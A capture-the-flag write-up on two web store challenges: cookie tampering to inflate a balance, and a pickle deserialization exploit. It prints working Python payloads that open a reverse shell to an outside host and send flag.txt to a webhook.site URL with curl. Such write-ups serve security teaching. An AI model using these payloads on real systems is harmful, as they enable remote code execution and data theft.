# Cookie Store
* In cookie store, we just need to decode the cookie from our web browser. 
* After decoding it, we found out that the money we have is kept inside the cookie. We can simply change the JSON object with a really high amount of money, and we will be able to purchase the flag cookie

# Pickle Store
* In this store, things are a bit different, although we are still storing the money inside the cookie, but now there is an anti_tamper_hmac. This means that we cannot modify the cookie like before, and we need to think of a new way to complete the challenge.

* Upon further inspection, we found out that the client is sending the server a packed pickled message with encoded JSON objects. And the server is unpacking the pickled message and retrieving the money and history and comparing the hmac.

* But we know that pickle itself is not secure at all. An attacker can create a pickled message that when unpacked, it will create a reverse shell to the attacker! 
* This can be done with the following python code
```python
import pickle
import base64

pack = lambda x : base64.b64encode(pickle.dumps(x))
unpack = lambda x : pickle.loads(base64.b64decode(x))

class POC(object):
    def __reduce__(self):
        import os
        command = '''
                  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("webhook",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
                  '''.strip()
        return (os.system, (command,))

print(pack(POC()))
# unpack(pack(POC()))
```

* To get the flag, we just have to cat the flag.txt instead of creating a reverse shell, we can do that with the following
```python
class POC(object):
    def __reduce__(self):
        import os
        s = "curl https://webhook.site/sfsfsaasdfsdf -d @- < flag.txt"
        return (os.popen, (s,))
print(pack(POC()))
```

* This malicious payload will be run on the sever, since it is a vulnerability within pickle itself, and we will then get the flag.
